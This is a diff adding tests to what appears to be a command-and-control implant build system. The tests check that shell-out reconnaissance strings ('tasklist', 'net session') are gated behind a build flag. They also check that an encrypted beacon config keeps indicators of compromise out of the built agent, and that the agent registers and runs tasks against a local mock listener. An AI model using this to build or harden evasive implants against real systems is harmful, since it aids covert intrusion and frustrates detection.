@@ -122,6 +122,80 @@ const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
     ok('build + hygiene denylist');
   }
 
+  // 6b. ticket 001: shellout code is dead-code-eliminated by default and only
+  //     compiled in via --allow-shellout (needs the minify pass)
+  {
+    let r = spawnSync(NODE, [path.join(ROOT, 'scripts', 'build_payload.js'),
+                             '--fixed-tokens', '--name', 'testmin'], { encoding: 'utf8' });
+    assert.strictEqual(r.status, 0, r.stderr + r.stdout);
+    let art = fs.readFileSync(path.join(ROOT, 'dist', 'testmin.js'), 'utf8');
+    for (const w of ['child_process', 'tasklist', 'net session'])
+      assert.ok(!art.includes(w), `shellout string '${w}' in default artifact`);
+    r = spawnSync(NODE, [path.join(ROOT, 'scripts', 'build_payload.js'),
+                         '--fixed-tokens', '--allow-shellout', '--name', 'testminsh'],
+                  { encoding: 'utf8' });
+    assert.strictEqual(r.status, 0, r.stderr + r.stdout);
+    art = fs.readFileSync(path.join(ROOT, 'dist', 'testminsh.js'), 'utf8');
+    assert.ok(art.includes('tasklist'), '--allow-shellout build lost the tasklist path');
+    ok('shellout gate: default strips / --allow-shellout keeps (001)');
+  }
+
+  // 6c. ticket 004: encrypted bake — config IoCs absent from the artifact AND
+  //     the baked build still runs a live round-trip (decode path works)
+  {
+    const port = 22000 + (process.pid % 20000);
+    const bakePath = path.join(__dirname, '.test-bake.json');
+    fs.writeFileSync(bakePath, JSON.stringify({
+      host: '127.0.0.1', port, ssl: false, http_method: 'POST',
+      uri: '/super-secret-uri.html', hb_header: 'X-Test-Hdr-zz9',
+      user_agent: 'TestAgentUA/9.9 zzz',
+      resp_template: '{"status": "ok", "data": "<<<PAYLOAD_DATA>>>","metrics": "sync"}',
+      encrypt_key: '00112233445566778899aabbccddeeff',
+      sleep_delay: 1, jitter_delay: 0, debug: true,
+    }));
+    const r = spawnSync(NODE, [path.join(ROOT, 'scripts', 'build_payload.js'),
+                               '--fixed-tokens', '--bake', bakePath, '--name', 'testbake'],
+                        { encoding: 'utf8' });
+    assert.strictEqual(r.status, 0, r.stderr + r.stdout);
+    assert.ok((r.stdout || '').includes('ENCRYPTED'), 'bake was not encrypted: ' + r.stdout);
+    const art = fs.readFileSync(path.join(ROOT, 'dist', 'testbake.js'), 'utf8');
+    // note: the <<<PAYLOAD_DATA>>> marker literal is protocol syntax in
+    // config.js's template validation — not a config IoC; not asserted here
+    for (const w of ['/super-secret-uri.html', 'X-Test-Hdr-zz9', 'TestAgentUA',
+                     '00112233445566778899aabbccddeeff',
+                     '/content.html', 'X-Request-Id', 'Chrome/126.0.0.0'])
+      assert.ok(!art.includes(w), `config string '${w}' leaked into artifact`);
+
+    const tasksFile2 = path.join(__dirname, '.tasks2.ndjson');
+    fs.writeFileSync(tasksFile2, '');
+    const mock2 = spawn(NODE, [path.join(__dirname, 'mock_listener.js'), '--tasks', tasksFile2],
+      { env: { ...process.env, LISTEN_PORT: String(port), LISTEN_HB: 'X-Test-Hdr-zz9' },
+        stdio: ['ignore', 'pipe', 'pipe'] });
+    let mout2 = '';
+    mock2.stdout.on('data', (d) => { mout2 += d; });
+    mock2.stderr.on('data', (d) => { mout2 += d; });
+    await sleep(600);
+    assert.ok(mout2.includes('[mock] listening'), 'mock2 up: ' + mout2);
+
+    const agent = spawn(NODE, [path.join(ROOT, 'dist', 'testbake.js')],
+      { env: { ...process.env, MAX_CYCLES: '12' }, stdio: ['ignore', 'pipe', 'pipe'] });
+    let aout2 = '';
+    agent.stdout.on('data', (d) => { aout2 += d; });
+    agent.stderr.on('data', (d) => { aout2 += d; });
+    const dl = Date.now() + 10000;
+    while (Date.now() < dl && !mout2.includes('[reg] NEW agent')) await sleep(200);
+    assert.ok(mout2.includes('[reg] NEW agent'), 'encrypted-bake registration: ' + mout2 + '\nagent: ' + aout2);
+    fs.writeFileSync(tasksFile2, JSON.stringify({ cmd: 4 }) + '\n');
+    const dl2 = Date.now() + 8000;
+    while (Date.now() < dl2 && !mout2.includes('cmd=4')) await sleep(200);
+    assert.ok(mout2.includes('cmd=4'), 'encrypted-bake pwd round-trip: ' + mout2);
+    try { agent.kill('SIGKILL'); } catch (_) {}
+    mock2.kill('SIGKILL');
+    fs.rmSync(bakePath, { force: true });
+    fs.rmSync(tasksFile2, { force: true });
+    ok('encrypted bake round-trip vs mock (004)');
+  }
+
   // 7. full round-trip: mock listener + built bundle agent
   {
     const port = 21000 + (process.pid % 20000);
